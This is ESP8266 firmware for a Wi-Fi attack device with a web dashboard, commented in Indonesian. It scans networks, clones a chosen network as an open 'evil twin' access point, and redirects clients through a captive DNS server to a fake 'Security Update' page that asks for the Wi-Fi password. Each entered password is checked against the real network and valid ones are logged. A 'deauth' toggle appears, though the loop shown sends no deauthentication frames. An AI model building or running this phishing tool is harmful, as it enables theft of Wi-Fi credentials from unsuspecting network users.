#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

extern "C" {
  #include "user_interface.h"
}

// Inisialisasi OLED 0.66" (64x48)
Adafruit_SSD1306 display(64, 48, &Wire, -1);
ESP8266WebServer server(80);
DNSServer dnsServer;

// Variabel Global
bool isAttacking = false, isETwin = false, isHidden = false;
String target_ssid = "", logs = "";
int target_ch = 1, pwnCount = 0;
String apSSID = "GMpro", apPASS = "sangkur87";

// Tampilan OLED Profesional
void updateOLED(String status) {
  display.clearDisplay();
  display.fillRect(0, 0, 64, 11, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(2, 2); display.print("SYS: v7.5");
  display.setTextColor(WHITE);
  display.setCursor(0, 16);
  display.print("T:"); display.println(target_ssid == "" ? "NONE" : target_ssid.substring(0,8));
  display.drawFastHLine(0, 26, 64, WHITE);
  display.setCursor(0, 31); display.print("CH:"); display.print(target_ch);
  display.setCursor(35, 31); display.print("P:"); display.print(pwnCount);
  display.setCursor(0, 40); display.print("> "); display.print(status);
  display.display();
}

// Dashboard Admin (Dark Mode Glassmorphism)
String getDashboard() {
  String s = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width,initial-scale=1'>";
  s += "<style>body{background:#0d0d0d;color:#ccff00;font-family:sans-serif;padding:15px;margin:0;}";
  s += ".card{background:rgba(255,255,255,0.05);padding:15px;border-radius:12px;margin:10px 0;border:1px solid #333;}";
  s += ".btn{display:block;width:100%;padding:14px;margin:8px 0;border-radius:8px;text-align:center;text-decoration:none;font-weight:bold;font-size:13px;border:none;cursor:pointer;}";
  s += ".btn-p{background:#ccff00;color:#000;} .btn-o{background:transparent;border:1px solid #ccff00;color:#ccff00;}";
  s += ".logs{background:#000;color:#0f0;padding:10px;height:120px;overflow-y:auto;font-family:monospace;font-size:11px;border-radius:8px;border:1px solid #222;}</style></head><body>";
  s += "<h2 style='text-align:center;letter-spacing:2px;'>GM-PRO V7.5</h2>";
  s += "<div class='card'><b>TARGET:</b> " + (target_ssid==""?"NONE":target_ssid) + " (CH:" + String(target_ch) + ")</div>";
  s += "<a href='/scan' class='btn btn-p'>1. SCAN NETWORKS</a>";
  s += "<a href='/atk' class='btn btn-o'>2. DEAUTH: " + String(isAttacking?"ON":"OFF") + "</a>";
  s += "<a href='/et' class='btn btn-o'>3. EVIL TWIN: " + String(isETwin?"ON":"OFF") + "</a>";
  s += "<div class='card' style='font-size:12px;'><b>FILE HTML:</b> " + String(LittleFS.exists("/index.html")?"UPLOADED":"DEFAULT") + "<form method='POST' action='/upload' enctype='multipart/form-data' style='margin-top:10px;'><input type='file' name='f' style='width:100px;'><input type='submit' value='Upload'></form></div>";
  s += "<b>PWN LOGS:</b><div class='logs'>" + (logs == "" ? "Waiting for data..." : logs) + "</div></body></html>";
  return s;
}

void setup() {
  Serial.begin(115200);
  LittleFS.begin();
  display.begin(SSD1306_SWITCHCAPVCC, 0x3C);
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden);
  dnsServer.start(53, "*", WiFi.softAPIP());
  updateOLED("READY");

  server.on("/", [](){ server.send(200, "text/html", getDashboard()); });

  // Fitur Upload HTML
  server.on("/upload", HTTP_POST, [](){
    server.send(200, "text/html", "Upload OK! <a href='/'>BACK</a>");
  }, [](){
    HTTPUpload& upload = server.upload();
    if(upload.status == UPLOAD_FILE_START){ LittleFS.remove("/index.html"); File f = LittleFS.open("/index.html", "w"); f.close(); }
    else if(upload.status == UPLOAD_FILE_WRITE){ File f = LittleFS.open("/index.html", "a"); f.write(upload.buf, upload.currentSize); f.close(); }
  });

  server.on("/scan", []() {
    int n = WiFi.scanNetworks(false);
    String sc = "<html><body style='background:#000;color:#0f0;font-family:sans-serif;padding:20px;'><h3>NETWORKS</h3>";
    for(int i=0; i<n; i++) {
      sc += "<div style='background:#111;padding:12px;margin-bottom:10px;border-radius:8px;border:1px solid #333;'>" + WiFi.SSID(i);
      sc += " <a href='/sel?s=" + WiFi.SSID(i) + "&c=" + String(WiFi.channel(i)) + "' style='color:#fff;float:right;text-decoration:none;'>[SELECT]</a></div>";
    }
    sc += "<br><a href='/' style='color:#888;'>CANCEL</a></body></html>";
    server.send(200, "text/html", sc);
  });

  server.on("/sel", []() {
    target_ssid = server.arg("s"); target_ch = server.arg("c").toInt();
    updateOLED("LOCKED");
    server.sendHeader("Location", "/"); server.send(302);
  });

  server.on("/atk", []() { isAttacking = !isAttacking; updateOLED(isAttacking?"ATK ON":"IDLE"); server.sendHeader("Location", "/"); server.send(302); });

  server.on("/et", []() {
    isETwin = !isETwin;
    if(isETwin && target_ssid != "") { WiFi.softAP(target_ssid.c_str(), "", 1, 0); updateOLED("ETWIN"); }
    else { WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden); updateOLED("READY"); }
    server.sendHeader("Location", "/"); server.send(302);
  });

  // Validasi ala Nethercap (Fast Validation)
  server.on("/l", []() {
    String p = server.arg("p");
    updateOLED("CHECK..");
    WiFi.begin(target_ssid.c_str(), p.c_str());
    unsigned long start = millis();
    bool v = false;
    while (millis() - start < 3500) { // Hanya 3.5 detik agar WiFi tidak putus lama
      if (WiFi.status() == WL_CONNECTED) { v = true; break; }
      delay(100);
    }
    if (v) {
      logs = "<b>[VALID]</b> " + p + "<br>" + logs; pwnCount++;
      isAttacking = false; isETwin = false;
      WiFi.disconnect(); WiFi.softAP(apSSID.c_str(), apPASS.c_str(), 1, isHidden);
      updateOLED("SUCCESS");
      server.send(200, "text/html", "Success! Reconnecting...");
    } else {
      updateOLED("INVALID");
      server.send(200, "text/html", "<html><script>alert('Incorrect Password! Try Again.'); window.location='/';</script></html>");
    }
  });

  server.onNotFound([]() {
    if (server.hostHeader() == "192.168.4.1") { server.send(200, "text/html", getDashboard()); return; }
    if (LittleFS.exists("/index.html")) { File f = LittleFS.open("/index.html", "r"); server.streamFile(f, "text/html"); f.close(); }
    else {
      String h = "<html><body style='text-align:center;padding-top:50px;'><h2>Security Update</h2>";
      h += "<p>Verification required.</p><form action='/l'><input type='password' name='p' required><br><br><input type='submit' value='Verify'></form></body></html>";
      server.send(200, "text/html", h);
    }
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  if (isAttacking && target_ssid != "") { wifi_set_channel(target_ch); delay(1); }
}
